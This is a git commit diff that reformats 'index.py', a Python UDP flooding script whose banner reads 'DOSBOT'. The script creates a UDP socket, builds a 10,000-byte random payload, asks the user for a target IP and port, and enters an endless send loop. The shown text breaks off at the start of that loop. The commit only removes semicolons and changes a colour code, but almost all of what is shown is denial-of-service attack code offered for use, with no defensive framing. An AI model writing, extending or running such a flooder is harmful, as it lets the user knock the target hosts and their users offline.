8bff77f6d62b6af5602ab963d4d79cfb3c572d28
BroMasters <36071011+BroMasters@users.noreply.github.com>
2019-08-22 17:39:34 +0300

    Update index.py

--- index.py
+++ index.py
@@ -1,21 +1,21 @@
-import sys;
-import os;
-import time;
-import socket;
-import random;
-from datetime import datetime;
-now = datetime.now();
-hour = now.hour;
-minute = now.minute;
-day = now.day;
-month = now.month;
-year = now.year;
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
-bytes = random._urandom(10000);
-timeout = time.time();
-os.system ("clear");
+import sys
+import os
+import time
+import socket
+import random
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(10000)
+timeout = time.time()
+os.system ("clear")
 print ("""
-\033[0;36;47m
+\033[1;36;40m
  ______   _______  _______  _______  _______  _______ 
 |      | |       ||       ||  _    ||       ||       |
 |  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
@@ -23,11 +23,11 @@ print ("""
 | |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
 |       ||       | _____| || |_|   ||       |  |   |  
 |______| |_______||_______||_______||_______|  |___|  
-""");
-ip = raw_input("\033[1;33;40mIP: ");
-port = input("\033[1;33;40mPort: ");
-os.system("clear");
-sent = 0;
+""")
+ip = raw_input("\033[1;33;40mIP: ")
+port = input("\033[1;33;40mPort: ")
+os.system("clear")
+sent = 0
 while True:
   while 1:
     if time.time() > timeout:
